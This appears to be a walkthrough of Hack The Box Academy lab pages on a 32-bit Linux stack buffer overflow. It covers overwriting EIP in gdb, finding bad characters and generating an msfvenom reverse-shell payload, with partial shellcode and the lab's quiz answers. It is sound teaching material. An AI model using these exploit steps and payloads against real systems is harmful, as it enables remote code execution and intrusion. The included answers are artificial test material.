If we now use precisely this number of bytes for our "`U`"s, we should land exactly on the `EIP`. To overwrite it and check if we have reached it as planned, we can add 4 more bytes with "`\x66`" and execute it to ensure we control the `EIP`.

#### GDB Offset

GDB Offset

```shell-session
(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png)

Now we see that we have overwritten the `EIP` with our "`\x66`" characters. Next, we have to find out how much space we have for our shellcode, which then executes the commands we intend. As we control the `EIP` now, we will later overwrite it with the address pointing to our shellcode's beginning.

Q: Examine the registers and submit the address of EBP as the answer.

A: 0x55555555

**Solution**

First Connect to the Target machine using `ssh` **Note: for connecting to ssh you have to connect to academy vpn server first**.After that there you will see a binary name `bow` so open it in `gdb` using the following command 
```shell
$ gdb -q bow
```
There use a simple `run` command and see its output and you can also see register information using `info register` command
After that use The following command there and see its output
```
(gdb) run $(python -c "print '\x55'*1200")
```
you can compare both results They are something like this
```
(gdb) info registers   
The program has no registers now.  
(gdb) run  
Starting program: /home/htb-student/bow    
  
Program received signal SIGSEGV, Segmentation fault.  
0xf7e729c8 in ?? () from /lib32/libc.so.6     <-----# simple run Results
(gdb) info registers    
eax            0x56556fd4       1448439764  
ecx            0x0      0  
edx            0xffffd090       -12144  
ebx            0x56556fd4       1448439764  
esp            0xffffd07c       0xffffd07c  
ebp            0xffffd498       0xffffd498  <----# Simple run epb value
esi            0xf7fc2000       -134471680  
edi            0x0      0  
eip            0xf7e729c8       0xf7e729c8  <----# Simple run eip value
eflags         0x10296  [ PF AF SF IF RF ]  
cs             0x23     35  
ss             0x2b     43  
ds             0x2b     43  
es             0x2b     43  
fs             0x0      0  
gs             0x63     99  
(gdb) run $(python -c "print '\x55'*1200")  
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /home/htb-student/bow $(python -c "print '\x55'*1200")  
  
Program received signal SIGSEGV, Segmentation fault.  
0x55555555 in ?? ()               <----# 1200 bytes of U in hex run Results
(gdb) info registers    
eax            0x1      1  
ecx            0xffffd6d0       -10544  
edx            0xffffd082       -12158  
ebx            0x55555555       1431655765  
esp            0xffffcff0       0xffffcff0  
ebp            0x55555555       0x55555555  <----# ebp value changed
esi            0xf7fc2000       -134471680  
edi            0x0      0  
eip            0x55555555       0x55555555  <-----# eip value changed
eflags         0x10282  [ SF IF RF ]  
cs             0x23     35  
ss             0x2b     43  
ds             0x2b     43  
es             0x2b     43  
fs             0x0      0  
gs             0x63     99
```
There we see when we run 1200 bytes of "U" in the form of hex we see our program output change and when we use `info register` command there we also see our `ebp` and `eip` register value is also changed.

**Page 7 / Determine the Length for Shellcode**

# Determine the Length for Shellcode

Now we should find out how much space we have for our shellcode to perform the action we want. It is trendy and useful for us to exploit such a vulnerability to get a reverse shell. First, we have to find out approximately how big our shellcode will be that we will insert, and for this, we will use `msfvenom`.

#### Shellcode - Length

Shellcode - Length

```shell-session
W4H33D@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
<SNIP>
```

We now know that our payload will be about 68 bytes. As a precaution, we should try to take a larger range if the shellcode increases due to later specifications.

Often it can be useful to insert some `no operation instruction` (`NOPS`) before our shellcode begins so that it can be executed cleanly. Let us briefly summarize what we need for this:

1.  We need a total of 1040 bytes to get to the `EIP`.
2.  Here, we can use an additional `100 bytes` of `NOPs`
3.  `150 bytes` for our `shellcode`.

Shellcode - Length

```shell-session
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4'
```

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png)

Now we can try to find out how much space we have available to insert our shellcode.

#### GDB

GDB

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png)

Q: How large can our shellcode theoretically become if we count NOPS and the shellcode size together? (Format: 00 Bytes)

A: 250 Bytes

**Page 8 / Identification of Bad Characters**

# Identification of Bad Characters

Previously in UNIX-like operating systems, binaries started with two bytes containing a "`magic number`" that determines the file type. In the beginning, this was used to identify object files for different platforms. Gradually this concept was transferred to other files, and now almost every file contains a magic number.

Such reserved characters also exist in applications, but they do not always occur and are not still the same. These reserved characters, also known as `bad characters` can vary, but often we will see characters like this:

-   `\x00` - Null Byte
-   `\x0A` - Line Feed
-   `\x0D` - Carriage Return
-   `\xFF` - Form Feed

Here we use the following character list to find out all characters we have to consider and to avoid when generating our shellcode.

#### Character List

Character List

```shell-session
W4H33D@htb[/htb]$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

To calculate the number of bytes in our CHARS variable, we can use bash by replacing the "\x" with space and then use `wc` to count the words.

#### Calculate CHARS Length

Calculate CHARS Length

```shell-session
W4H33D@htb[/htb]$ echo $CHARS | sed 's/\\x/ /g' | wc -w

256
```

This string is `256` bytes long. So we need to calculate our buffer again.

#### Notes

Notes

```shell-session
Buffer = "\x55" * (1040 - 256 - 4) = 780
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

Now let us have a look at the whole main function. Because if we execute it now, the program will crash without giving us the possibility to follow what happens in the memory. So we will set a breakpoint at the corresponding function so that the execution stops at this point, and we can analyze the memory's content.

Notes

```shell-session
(gdb) disas main
Dump of assembler code for function main:
   0x56555582 <+0>: 	lea    ecx,[esp+0x4]
   0x56555586 <+4>: 	and    esp,0xfffffff0
   0x56555589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x5655558c <+10>:	push   ebp
   0x5655558d <+11>:	mov    ebp,esp
   0x5655558f <+13>:	push   ebx
   0x56555590 <+14>:	push   ecx
   0x56555591 <+15>:	call   0x56555450 <__x86.get_pc_thunk.bx>
   0x56555596 <+20>:	add    ebx,0x1a3e
   0x5655559c <+26>:	mov    eax,ecx
   0x5655559e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x565555a1 <+31>:	add    eax,0x4
   0x565555a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x565555a6 <+36>:	sub    esp,0xc
   0x565555a9 <+39>:	push   eax
   0x565555aa <+40>:	call   0x5655554d <bowfunc>		# <---- bowfunc Function
   0x565555af <+45>:	add    esp,0x10
   0x565555b2 <+48>:	sub    esp,0xc
   0x565555b5 <+51>:	lea    eax,[ebx-0x1974]
   0x565555bb <+57>:	push   eax
   0x565555bc <+58>:	call   0x565553e0 <puts@plt>
   0x565555c1 <+63>:	add    esp,0x10
   0x565555c4 <+66>:	mov    eax,0x1
   0x565555c9 <+71>:	lea    esp,[ebp-0x8]
   0x565555cc <+74>:	pop    ecx
   0x565555cd <+75>:	pop    ebx
   0x565555ce <+76>:	pop    ebp
   0x565555cf <+77>:	lea    esp,[ecx-0x4]
   0x565555d2 <+80>:	ret    
End of assembler dump.
```

To set the breakpoint, we give the command "`break`" with the corresponding function name.

#### GDB Breakpoint

GDB Breakpoint

```shell-session
(gdb) break bowfunc 

Breakpoint 1 at 0x56555551
```

And now, we can execute the newly created input and look at the memory.

#### Send CHARS

Send CHARS

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
/bin/bash: warning: command substitution: ignored null byte in input

Breakpoint 1, 0x56555551 in bowfunc ()
```

After we have executed our buffer with the bad characters and reached the breakpoint, we can look at the stack.

#### The Stack

The Stack

```shell-session
(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
				 # |---> "\x55"s begin

0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

Here we recognize at which address our "`\x55`" begins. From here, we can go further down and look for the place where our `CHARS` start.

#### The Stack - CHARS

The Stack - CHARS

```shell-session
<SNIP>
0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
												 # |---> CHARS begin

0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
<SNIP>
```

We see where our "`\x55`" ends, and the `CHARS` variable begins. But if we look closely at it, we will see that it starts with "`\x01`" instead of "`\x00`". We have already seen the warning during the execution that the `null byte` in our input was ignored.

So we can note this character, remove it from our variable `CHARS` and adjust the number of our "`\x55`".

#### Notes

Notes

```shell-session
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 255 - 4) = 781

# "\x00" removed: 256 - 1 = 255 bytes
 CHARS = "\x01\x02\x03...<SNIP>...\xfd\xfe\xff"
 
   EIP = "\x66" * 4
```

#### Send CHARS - Without Null Byte

Send CHARS - Without Null Byte

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```

#### The Stack

The Stack

```shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x09" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

Here it depends on our bytes' correct order in the variable `CHARS` to see if any character changes, interrupts, or skips the order. Now we recognize that after the "`\x08`", we encounter the "`\x00`" instead of the "`\x09`" as expected. This tells us that this character is not allowed here and must be removed accordingly.

#### Notes

Notes

```shell-session
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 254 - 4) = 782	

# "\x00" & "\x09" removed: 256 - 2 = 254 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
```

#### Send CHARS - Without "\x00" & "\x09"

Send CHARS - Without "\x00" & "\x09"

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```

#### The Stack

The Stack

```shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x0a" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

This process must be repeated until all characters that could interrupt the flow are removed.

Q: Find all bad characters that change or interrupt our sent bytes' order and submit them as the answer (e.g., format: \x00\x11).

**Hint: There are 4 different bad characters in total.**

A: `\x00\x09\x0a\x20`

**Solution**

Connect to the academy vpn after that connect to the machine using ssh **Note: In this part they didn't have a deploy button so go to the previous page and there deploy the machine and connect to it** after connecting to the ssh run the `bow` binary in `gdb` using the following command.
```shell
$ gdb -q bow
```
Now you open the binary in `gdb` so now use the `disas main` command in `gdb` this will disassemble main function There you can see `bow func` call so we can set break point there that means program will broke that point and then we can see what is the value of registers.we can set break point with the following command
```gdb
(gdb) break bowfunc
```
Now our break point is set so we can run the program with our input that contains the value of buffer,Bad Characters and our payload etc.

Bad Characters are following
```bad char
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

So we have to see which bad characters are ignored in memory so we run the command like following

```gdb
(gdb) run $(python -c 'print "\x55"*(1040-256-4)+ "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f  
\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2  
c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x  
49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\  
x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82  
\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9  
f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\x  
bc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\  
xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5  
\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"+ "\x66"*4')
```
So when this run and our break point will call so then we use the following command to see our register values to see what happened there.
```
(gdb) x/2000xb $esp+500
```
There we see output like following
```
<snip...>

0xffffd2b0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00  
0xffffd2b8:     0x00    0x00    0x00    0x2f    0x68    0x6f    0x6d    0x65  
0xffffd2c0:     0x2f    0x68    0x74    0x62    0x2d    0x73    0x74    0x75  
0xffffd2c8:     0x64    0x65    0x6e    0x74    0x2f    0x62    0x6f    0x77  
0xffffd2d0:     0x00   # --> From here our suplied values starts 0x55  0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd2d8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd2e0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd2e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55 

<snip...>

0xffffd5a8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd5b0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd5b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd5c0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd5c8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd5d0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd5d8:     0x55    0x55    0x55    0x55    0x55  # ---> From Here our Bad Characters starts   0x01    0x02    0x03  
0xffffd5e0:     0x04    0x05    0x06    0x07    0x08 # ---> From here we expect "0x09"   0x00    0x0b    0x0c  
---Type <return> to continue, or q <return> to quit---  
0xffffd5e8:     0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14  
0xffffd5f0:     0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c  
0xffffd5f8:     0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23    0x24  
0xffffd600:     0x25    0x26    0x27    0x28    0x29    0x2a    0x2b    0x2c  
0xffffd608:     0x2d    0x2e    0x2f    0x30    0x31    0x32    0x33    0x34  
0xffffd610:     0x35    0x36    0x37    0x38    0x39    0x3a    0x3b    0x3c  
0xffffd618:     0x3d    0x3e    0x3f    0x40    0x41    0x42    0x43    0x44  
0xffffd620:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c  
0xffffd628:     0x4d    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54
```
So here we see when our supplied values is start after that all values contains `\x55` that is our buffer value we supplied we see that when they ends then our bad characters starts and they starts with `0x01` but they have to start with `0x00`(Null byte) so that means they skip that byte and that's our first bad character. So now we have to remove it from our character list so when removing that character our `run` would like this 
```
(gdb) run $(python -c 'print "\x55"*(1040-256-4)+ "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10  
\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2  
d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x  
4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\  
x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83  
\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa  
0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\x  
bd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\  
xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6  
\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"+ "\x66"*4')
```
You can see here we remove `\x00` in our character list so when we run that command now we see the output like the following
```
0xffffd5d8:     0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03  
0xffffd5e0:     0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
<snip..>
```
There we see after `0x08` we expect `0x09` but we didn't see it so that's our second bad character so we remove it also so now our command after removing is like this
```
(gdb) run $(python -c 'print "\x55"*(1040-256-4)+ "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12  
\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2  
f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x  
4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\  
x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85  
\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa  
2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\x  
bf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\  
xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8  
\xf9\xfa\xfb\xfc\xfd\xfe\xff"+ "\x66"*4')
```
There we remove our `\x09` and after we again use `x/2000xb $esp+500` command to see the register values and now our output like this
```
0xffffd5d8:     0x55    0x55    0x55    0x55    0x55    0x55    0x01    0x02  
0xffffd5e0:     0x03    0x04    0x05    0x06    0x07    0x08    0x0b    0x0c  
---Type <return> to continue, or q <return> to quit---  
0xffffd5e8:     0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14  
0xffffd5f0:     0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c  
0xffffd5f8:     0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23    0x24

```
There we see after `0x08` we expect `0x09` that we remove from our list but after that we see `0x0b` so they skip `0x0a` so that our third bad character so we remove it also and in manner we have to find all the bad characters and we can see `0x20` is also skip and after that everything is all right so we got our four bad characters `0x00` `0x09` `0x0a` `0x20`

**Page 9 / Generating Shellcode**

# Generating Shellcode

We already got to know the tool `msfvenom` with which we generated our shellcode's approximate length. Now we can use this tool again to generate the actual shellcode, which makes the CPU of our target system execute the command we want to have.

But before we generate our shellcode, we have to make sure that the individual components and properties match the target system. Therefore we have to pay attention to the following areas:

-   `Architecture`
-   `Platform`
-   `Bad Characters`

#### MSFvenom Syntax

MSFvenom Syntax

```shell-session
W4H33D@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```

#### MSFvenom - Generate Shellcode

MSFvenom - Generate Shellcode

```shell-session
W4H33D@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```

#### Shellcode

Shellcode

```shell-session
W4H33D@htb[/htb]$ cat shellcode

unsigned char buf[] = 
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
<SNIP>
```

Now that we have our shellcode, we adjust it to have only one string, and then we can adapt and submit our simple exploit again.

#### Notes

Notes

```shell-session
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

#### Exploit with Shellcode

Exploit with Shellcode

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

Next, we check if the first bytes of our shellcode match the bytes after the NOPS.

#### The Stack

The Stack

```shell-session
(gdb) (gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
